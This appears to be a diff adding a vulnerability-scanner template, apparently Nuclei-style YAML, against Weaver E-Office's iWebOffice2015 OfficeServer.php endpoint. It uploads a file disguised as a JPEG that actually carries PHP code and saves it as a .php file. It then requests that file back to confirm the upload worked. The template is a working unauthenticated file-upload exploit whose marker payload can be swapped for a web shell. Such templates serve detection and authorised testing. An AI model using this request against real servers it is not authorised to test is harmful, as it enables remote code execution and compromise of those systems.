@@ -1,0 +1,33 @@
+id: yaml-poc-weaver-weaver_e_office-file_upload-CT-456777
+info:
+  name: Yaml Poc Weaver Weaver_E_Office File_Upload Ct 456777
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-weaver-weaver_e_office-file_upload-CT-456777'
+  tags: fileupload
+  reference:
+  - https://planet.vulbox.com/detail/MTEwMTc=
+http:
+- method: POST
+  path:
+  - /eoffice10/server/public/iWebOffice2015/OfficeServer.php
+  body: "------WebKitFormBoundaryJjb5ZAJOOXO7fwjs\r\nContent-Disposition: form-data;\
+    \ name=\"FileData\"; filename=\"1.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\
+    \ echo {{s1}};?>\r\n------WebKitFormBoundaryJjb5ZAJOOXO7fwjs\r\nContent-Disposition:\
+    \ form-data; name=\"FormData\"\r\n\r\n{\"USERNAME\":\"\",\"RECORDID\":\"undefined\"\
+    ,\"OPTION\":\"SAVEFILE\",\"FILENAME\":\"{{s2}}.php\"}\r\n------WebKitFormBoundaryJjb5ZAJOOXO7fwjs--"
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJjb5ZAJOOXO7fwjs
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: GET
+  path:
+  - /eoffice10/server/public/iWebOffice2015/Document/{{s2}}.php
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
